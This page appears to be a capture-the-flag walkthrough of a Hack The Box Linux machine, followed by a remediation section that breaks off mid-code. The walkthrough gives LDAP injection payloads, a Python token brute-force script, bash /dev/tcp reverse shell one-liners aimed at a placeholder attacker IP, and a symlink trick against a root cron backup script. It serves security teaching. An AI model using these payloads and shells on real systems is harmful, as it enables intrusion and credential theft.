<!doctype html><html lang=en><head><title>CTF HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of CTF HTB machine featuring LDAP injection exploitation, software token enumeration via brute force, OTP bypass through time synchronization, and privilege escalation via backup script symbolic link attacks"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/ctf-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="CTF HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of CTF HTB machine featuring LDAP injection exploitation, software token enumeration via brute force, OTP bypass through time synchronization, and privilege escalation via backup script symbolic link attacks"><meta property="og:url" content="https://malayamanas.github.io/posts/ctf-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 09:00:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/ctf-htb-walkthrough/>CTF HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ldap-injection/>ldap-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/token/>token</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/stoken/>stoken</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/otp/>otp</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/brute-force/>brute-force</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/backup-script/>backup-script</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/symbolic-link/>symbolic-link</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ssh/>ssh</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/cron/>cron</a>&nbsp;</span><div class=post-content><div><h1 id=ctf-htb---insane-linux-box-walkthrough>CTF HTB - Insane Linux Box Walkthrough<a href=#ctf-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/51JQg202csw?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques>Key Exploitation Steps and Techniques<a href=#key-exploitation-steps-and-techniques class=hanchor arialabel=Anchor>#</a></h2><p>Below is a chronological summary of the key exploitation steps and techniques used in the Hack The Box CTF challenge, as extracted from the provided data.</p><h3 id=1-initial-enumeration-with-nmap>1. Initial Enumeration with Nmap<a href=#1-initial-enumeration-with-nmap class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Network scanning using Nmap with default scripts and version enumeration.</li><li><strong>Command</strong>: <code>nmap -sC -sV -oA nmap/CTF [TARGET-IP]</code></li><li><strong>Findings</strong>:<ul><li>Port 22: SSH (OpenSSH 7.4)</li><li>Port 80: HTTP (Apache httpd 2.4.6, CentOS)</li></ul></li><li><strong>Purpose</strong>: Identify open ports, services, and operating system to understand the attack surface.</li></ul><h3 id=2-web-server-exploration>2. Web Server Exploration<a href=#2-web-server-exploration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Manual inspection of the web page hosted on port 80.</li><li><strong>Steps</strong>:<ul><li>Navigated to <code>http://[TARGET-IP]</code> in Firefox.</li><li>Identified a login page requiring a username and one-time password (OTP).</li><li>Noted warnings about brute-force protection and a &ldquo;wall of sheep&rdquo; listing banned IPs.</li><li>Reviewed page source for hints, finding a reference to an 81-digit software token stored in an existing attribute.</li></ul></li><li><strong>Purpose</strong>: Gather information about the web application and its authentication mechanism.</li></ul><h3 id=3-testing-for-cross-site-scripting-xss>3. Testing for Cross-Site Scripting (XSS)<a href=#3-testing-for-cross-site-scripting-xss class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Attempted XSS by injecting HTML tags (e.g., <code>&lt;b></code>) in the username field.</li><li><strong>Result</strong>: No response, indicating XSS filtering or lack of vulnerability.</li><li><strong>Purpose</strong>: Test for basic input validation weaknesses.</li></ul><h3 id=4-double-url-encoding-attempt>4. Double URL Encoding Attempt<a href=#4-double-url-encoding-attempt class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Used Burp Suite to manipulate login requests with double URL encoding to bypass potential input filters.</li><li><strong>Steps</strong>:<ul><li>Intercepted login request with Burp Suite.</li><li>Encoded input (e.g., <code>username=test%3A%3B</code>, <code>OTP=1234</code>) and tested for bypass.</li><li>Resulted in &ldquo;user is not found,&rdquo; suggesting blacklisting of certain characters.</li></ul></li><li><strong>Purpose</strong>: Attempt to evade input validation or blacklisting mechanisms.</li></ul><h3 id=5-research-on-software-tokens>5. Research on Software Tokens<a href=#5-research-on-software-tokens class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Researched software token implementations for Linux, focusing on the 81-digit token mentioned in the page source.</li><li><strong>Findings</strong>:<ul><li>Identified <code>stoken</code> as a potential software token application (RSA SecurID 128-bit compliant).</li><li>Noted that <code>stoken</code> requires a seed and user information to generate tokens.</li></ul></li><li><strong>Purpose</strong>: Understand the authentication mechanism and its reliance on software tokens.</li></ul><h3 id=6-username-enumeration-with-wfuzz>6. Username Enumeration with wfuzz<a href=#6-username-enumeration-with-wfuzz class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Brute-forced usernames using <code>wfuzz</code> with a small username wordlist to avoid triggering brute-force protection.</li><li><strong>Command</strong>: <code>wfuzz -H -D "inputUsername=FUZZ&amp;inputOTP=1234" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt http://[TARGET-IP]/login.php</code></li><li><strong>Result</strong>: No valid usernames found initially, as responses showed consistent 233 words (indicating &ldquo;user not found&rdquo;).</li><li><strong>Purpose</strong>: Identify valid usernames for the login form.</li></ul><h3 id=7-identifying-ldap-injection>7. Identifying LDAP Injection<a href=#7-identifying-ldap-injection class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Tested special characters to identify blacklisted inputs and suspected LDAP injection due to specific character filtering (e.g., null byte, parentheses, wildcard, backslash).</li><li><strong>Steps</strong>:<ul><li>Used <code>wfuzz</code> with a special characters wordlist: <code>wfuzz -H -D "inputUsername=FUZZ&amp;inputOTP=1234" -w /usr/share/seclists/Fuzzing/special-chars.txt http://[TARGET-IP]/login.php</code></li><li>Identified blacklisted characters: null byte (<code>%00</code>), open parenthesis (<code>%28</code>), close parenthesis (<code>%29</code>), wildcard (<code>%2A</code>), backslash (<code>%5C</code>).</li><li>Noted that a wildcard (<code>%2A</code>) with username resulted in &ldquo;cannot login&rdquo; instead of &ldquo;user not found,&rdquo; suggesting a valid username or query success.</li></ul></li><li><strong>Purpose</strong>: Confirm LDAP injection vulnerability due to specific character filtering patterns.</li></ul><h3 id=8-ldap-username-discovery>8. LDAP Username Discovery<a href=#8-ldap-username-discovery class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Used LDAP injection with wildcard to brute-force username characters.</li><li><strong>Steps</strong>:<ul><li>Ran <code>wfuzz</code> with a character set (a-z) appended with wildcard: <code>wfuzz -H -D "inputUsername=FUZZ%252A&amp;inputOTP=1234" -w /usr/share/seclists/Fuzzing/1-char.txt http://[TARGET-IP]/login.php</code></li><li>Identified username by iteratively building it: <code>L</code>, <code>LD</code>, <code>LDA</code>, <code>LDAP</code>, <code>LDAPu</code>, <code>LDAPus</code>, <code>LDAPuse</code>, <code>LDAPuser</code>.</li><li>Validated username <code>LDAPuser</code> with OTP <code>1234</code>, resulting in &ldquo;cannot login.&rdquo;</li></ul></li><li><strong>Purpose</strong>: Discover the valid username <code>LDAPuser</code> through LDAP injection.</li></ul><h3 id=9-ldap-attribute-enumeration>9. LDAP Attribute Enumeration<a href=#9-ldap-attribute-enumeration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Used LDAP injection to enumerate valid attributes.</li><li><strong>Steps</strong>:<ul><li>Crafted LDAP query: <code>LDAPuser%29%28FUZZ%3D%2A</code> (translated to <code>LDAPuser)(FUZZ=*)</code>) to enumerate attributes.</li><li>Used <code>wfuzz</code> with an LDAP attributes wordlist: <code>wfuzz -H -D "inputUsername=LDAPuser%29%28FUZZ%3D%2A&amp;inputOTP=1234" -w attributes.txt http://[TARGET-IP]/login.php</code></li><li>Identified valid attributes: <code>cn</code>, <code>name</code>, <code>mail</code>, <code>objectClass</code>, <code>pager</code>, <code>password</code>, <code>sn</code>, <code>uid</code>.</li></ul></li><li><strong>Purpose</strong>: Identify attributes in the LDAP schema, focusing on <code>pager</code> as the likely storage for the 81-digit token.</li></ul><h3 id=10-token-brute-forcing-with-python-script>10. Token Brute-Forcing with Python Script<a href=#10-token-brute-forcing-with-python-script class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Developed a Python script to brute-force the 81-digit token stored in the <code>pager</code> attribute.</li><li><strong>Steps</strong>:<ul><li>Created <code>brute.py</code> to automate LDAP injection for token enumeration.</li><li>Script logic:<ul><li>Iterated through digits (0-9) to build the token.</li><li>Constructed LDAP query: <code>LDAPuser)(pager=tokenFUZZ*</code> (e.g., <code>LDAPuser)(pager=28FUZZ*</code>).</li><li>Sent POST requests to <code>http://[TARGET-IP]/login.php</code> with Burp proxy.</li><li>Checked for &ldquo;cannot login&rdquo; response to indicate a valid token prefix.</li><li>Included sleep to avoid brute-force bans.</li></ul></li><li>Output token after 81 iterations (noted a trailing incorrect character).</li></ul></li><li><strong>Script Content</strong>:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> sleep
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> string <span style=color:#f92672>import</span> digits
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://[TARGET-IP]/login.php&#34;</span>
</span></span><span style=display:flex><span>proxy <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;http&#34;</span>: <span style=color:#e6db74>&#34;http://localhost:8080&#34;</span>}
</span></span><span style=display:flex><span>attribute <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;pager&#34;</span>
</span></span><span style=display:flex><span>token <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>loop <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> loop:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> digit <span style=color:#f92672>in</span> digits:
</span></span><span style=display:flex><span>        query <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;LDAPuser)(</span><span style=color:#e6db74>{</span>attribute<span style=color:#e6db74>}</span><span style=color:#e6db74>=</span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}{</span>digit<span style=color:#e6db74>}</span><span style=color:#e6db74>*&#34;</span>
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;inputUsername&#34;</span>: query, <span style=color:#e6db74>&#34;inputOTP&#34;</span>: <span style=color:#e6db74>&#34;1234&#34;</span>}
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>data, proxies<span style=color:#f92672>=</span>proxy)
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>write(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>token: </span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}{</span>digit<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>stdout<span style=color:#f92672>.</span>flush()
</span></span><span style=display:flex><span>        sleep(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;cannot login&#34;</span> <span style=color:#f92672>in</span> response<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>            token <span style=color:#f92672>=</span> token <span style=color:#f92672>+</span> digit
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>success: </span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            sleep(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> digit <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;9&#34;</span>:
</span></span><span style=display:flex><span>            loop <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><ul><li><strong>Result</strong>: Obtained an 81-digit token (82 characters with an incorrect trailing character).</li><li><strong>Purpose</strong>: Retrieve the software token required for authentication.</li></ul><h3 id=11-time-synchronization-for-token-validation>11. Time Synchronization for Token Validation<a href=#11-time-synchronization-for-token-validation class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Used <code>stoken</code> to generate OTP and synchronized system time to match the server.</li><li><strong>Steps</strong>:<ul><li>Installed <code>stoken</code> and ran: <code>stoken --token=&lt;81-digit-token></code>.</li><li>Noted requirement for a 4-8 digit PIN; used <code>0000</code>.</li><li>Identified server time in response headers (e.g., 09:55 GMT).</li><li>Disabled NTP: <code>timedatectl set-ntp 0</code>.</li><li>Set local time: <code>date -s 1757</code>.</li><li>Generated OTP and tested login with <code>LDAPuser</code> and OTP, resulting in a command execution interface.</li></ul></li><li><strong>Purpose</strong>: Generate a valid OTP by aligning client and server time.</li></ul><h3 id=12-bypassing-group-membership-check>12. Bypassing Group Membership Check<a href=#12-bypassing-group-membership-check class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Used LDAP injection with a null byte to bypass group membership check (<code>memberOf ADM</code> or <code>root</code>).</li><li><strong>Steps</strong>:<ul><li>Crafted query: <code>LDAPuser%00</code> to terminate the LDAP query early.</li><li>Sent via Burp Suite, avoiding double URL encoding by the browser.</li><li>Successfully logged in, receiving a command execution interface.</li></ul></li><li><strong>Purpose</strong>: Gain command execution by bypassing LDAP query restrictions.</li></ul><h3 id=13-command-execution-and-reverse-shell>13. Command Execution and Reverse Shell<a href=#13-command-execution-and-reverse-shell class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Executed commands via the web interface and established a reverse shell.</li><li><strong>Steps</strong>:<ul><li>Issued <code>whoami</code> command, confirming <code>apache</code> user.</li><li>Attempted reverse shell: <code>bash -c "bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&amp;1"</code>.</li><li>Switched to port 443 due to firewall restrictions: <code>bash -c "bash -i >& /dev/tcp/[ATTACKER-IP]/443 0>&amp;1"</code>.</li><li>Established reverse shell as <code>apache</code> user.</li></ul></li><li><strong>Purpose</strong>: Gain interactive shell access to the system.</li></ul><h3 id=14-ssh-access-as-ldapuser>14. SSH Access as LDAPuser<a href=#14-ssh-access-as-ldapuser class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Used LDAP credentials found in <code>login.php</code> to SSH into the box.</li><li><strong>Steps</strong>:<ul><li>Inspected <code>login.php</code> to find LDAP bind credentials: <code>LDAPuser</code> and password.</li><li>SSH command: <code>ssh LDAPuser@[TARGET-IP]</code>.</li><li>Successfully logged in and accessed <code>user.txt</code>.</li></ul></li><li><strong>Purpose</strong>: Gain a more stable shell with proper TTY support.</li></ul><h3 id=15-privilege-escalation-via-backup-script>15. Privilege Escalation via Backup Script<a href=#15-privilege-escalation-via-backup-script class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Exploited a backup script to read <code>root.txt</code> via symbolic link manipulation.</li><li><strong>Steps</strong>:<ul><li>Identified a cron job running <code>honeypot.sh</code> every minute, creating 7z backups in <code>/backup</code>.</li><li>Noted script used relative paths and a list file for archiving.</li><li>As <code>apache</code> user, created files in <code>/var/www/html/uploads</code>:<ul><li><code>touch @pleasesub</code></li><li><code>ln -s /root/root.txt /var/www/html/uploads/pleasesub</code></li></ul></li><li>Waited for cron job to run, which archived <code>root.txt</code> contents into an error log due to access denial.</li><li>Read the error log to extract the <code>root.txt</code> hash.</li></ul></li><li><strong>Purpose</strong>: Obtain the root flag without full root access.</li></ul><h3 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>#</a></h3><p>The exploitation involved:</p><ul><li>Enumerating services and identifying a web-based login system.</li><li>Discovering LDAP injection to enumerate usernames and attributes.</li><li>Brute-forcing an 81-digit token using a Python script.</li><li>Synchronizing time to generate valid OTPs with <code>stoken</code>.</li><li>Bypassing group checks with LDAP injection.</li><li>Gaining command execution and a reverse shell as <code>apache</code>.</li><li>Using SSH as <code>LDAPuser</code> for stable access.</li><li>Exploiting a backup script to read <code>root.txt</code> via symbolic link manipulation.</li></ul><p>This approach relied heavily on LDAP injection, careful enumeration, and exploiting misconfigurations in the backup process.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Below is a list of identified gaps in the services and systems from the provided Hack The Box CTF challenge, along with recommended fixes categorized as either source code fixes or configuration fixes. These gaps contributed to the successful exploitation of the system.</p><h3 id=1-web-application-apache-httpd-on-port-80>1. Web Application (Apache HTTPD on Port 80)<a href=#1-web-application-apache-httpd-on-port-80 class=hanchor arialabel=Anchor>#</a></h3><h4 id=gap-1-ldap-injection-vulnerability>Gap 1: LDAP Injection Vulnerability<a href=#gap-1-ldap-injection-vulnerability class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The login form is susceptible to LDAP injection due to improper input validation, allowing attackers to manipulate LDAP queries by injecting special characters (e.g., <code>)</code>, <code>*</code>, <code>%00</code>) to enumerate usernames, attributes, and bypass authentication checks.</li><li><strong>Impact</strong>: Enabled enumeration of valid usernames (<code>LDAPuser</code>), attributes (<code>pager</code>, etc.), and bypassing group membership checks.</li><li><strong>Fix Type</strong>: Source Code Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Input Validation and Sanitization</strong>: Implement strict input validation for the <code>inputUsername</code> and <code>inputOTP</code> fields to reject or escape LDAP special characters (e.g., <code>(</code>, <code>)</code>, <code>*</code>, <code>&</code>, <code>|</code>, <code>\</code>, <code>%00</code>).</li><li><strong>Prepared Statements</strong>: Use parameterized LDAP queries to prevent injection by ensuring user inputs are treated as data, not query logic. For example, use LDAP libraries that support parameterized queries (e.g., in PHP, use <code>ldap_escape()</code> to sanitize inputs).</li><li><strong>Example</strong> (PHP):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_escape</span>($_POST[<span style=color:#e6db74>&#39;inputUsername&#39;</span>], <span style=color:#66d9ef>null</span>, <span style=color:#a6e22e>LDAP_ESCAPE_FILTER</span>);
</span></span><span style=display:flex><span>$otp <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_escape</span>($_POST[<span style=color:#e6db74>&#39;inputOTP&#39;</span>], <span style=color:#66d9ef>null</span>, <span style=color:#a6e22e>LDAP_ESCAPE_FILTER</span>);
</span></span><span style=display:flex><span>$ldap_query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;(uid=</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>)&#34;</span>;
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong> (if applicable):<ul><li>Configure the LDAP server to enforce stricter query parsing or disable anonymous binds if not required, reducing the attack surface.</li></ul></li></ul><h4 id=gap-2-inadequate-brute-force-protection>Gap 2: Inadequate Brute-Force Protection<a href=#gap-2-inadequate-brute-force-protection class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The brute-force protection mechanism bans IPs temporarily but allows small wordlists and does not effectively limit automated requests, enabling username and token enumeration via tools like <code>wfuzz</code>.</li><li><strong>Impact</strong>: Allowed enumeration of usernames and token characters without triggering bans consistently.</li><li><strong>Fix Type</strong>: Source Code Fix and Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Implement rate-limiting logic in the application to track and limit login attempts per IP or user within a time window (e.g., 5 attempts per minute).</li><li>Use CAPTCHA or multi-factor authentication challenges after a threshold of failed attempts.</li><li>Example (PHP with rate-limiting):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;login_attempts&#39;</span>])) {
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;login_attempts&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;last_attempt&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>time</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_SESSION[<span style=color:#e6db74>&#39;login_attempts&#39;</span>] <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>time</span>() <span style=color:#f92672>-</span> $_SESSION[<span style=color:#e6db74>&#39;last_attempt&#39;</span>]) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>300</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Too many login attempts. Try again later.&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;login_attempts&#39;</span>]<span style=color:#f92672>++</span>;
</span></span></code></pre></div></li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure a Web Application Firewall (WAF) to enforce rate-limiting or block rapid successive requests to <code>/login.php</code>.</li><li>Example (Apache with <code>mod_security</code>):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span>SecRule REQUEST_URI <span style=color:#e6db74>&#34;/login.php&#34;</span> <span style=color:#e6db74>&#34;phase:1,deny,t:none,ctl:requestBodyAccess=On,rateLimit:5/300&#34;</span>
</span></span></code></pre></div></li></ul></li></ul></li><li><strong>Additional Note</strong>: Ensure the ban list (&ldquo;wall of sheep&rdquo;) is not publicly accessible to prevent attackers from monitoring bans.</li></ul><h4 id=gap-3-improper-handling-of-url-encoding>Gap 3: Improper Handling of URL Encoding<a href=#gap-3-improper-handling-of-url-encoding class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The application fails to properly handle double URL encoding, allowing attackers to bypass blacklisting filters by encoding special characters (e.g., <code>%252A</code> for <code>*</code>).</li><li><strong>Impact</strong>: Enabled LDAP injection by bypassing character blacklisting.</li><li><strong>Fix Type</strong>: Source Code Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Decode Inputs Consistently</strong>: Ensure all user inputs are fully decoded before processing or validation to prevent encoding-based bypasses. For example, decode <code>%252A</code> to <code>%2A</code> to <code>*</code> and validate the final decoded input.</li><li><strong>Example</strong> (PHP):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>rawurldecode</span>($_POST[<span style=color:#e6db74>&#39;inputUsername&#39;</span>]);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[\(\)\*\&amp;\|\0]/&#39;</span>, $username)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Invalid characters in username.&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li><strong>Blacklist Validation</strong>: Strengthen blacklisting to check for encoded and decoded forms of dangerous characters before processing LDAP queries.</li></ul></li></ul><h3 id=2-ldap-server>2. LDAP Server<a href=#2-ldap-server class=hanchor arialabel=Anchor>#</a></h3><h4 id=gap-4-permissive-ldap-query-structure>Gap 4: Permissive LDAP Query Structure<a href=#gap-4-permissive-ldap-query-structure class=hanchor arialabel=Anchor>#</a></h4><ul><li><strong>Description</strong>: The LDAP server allows queries with nested conditions and does not enforce strict attribute or group membership validation, enabling null byte (<code>%00</code>) injection to truncate queries and bypass group checks (e.g., <code>memberOf ADM or root</code>).</li><li><strong>Impact</strong>: Allowed attackers to bypass authentication restrictions by terminating queries early.</li><li><strong>Fix Type</strong>: Source Code Fix and Configuration Fix</li><li><strong>Recommended Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Validate LDAP query results to ensure all conditions (e.g., group membership) are met before granting access.</li><li>Example (PHP with LDAP):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$result <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_search</span>($ldap_conn, <span 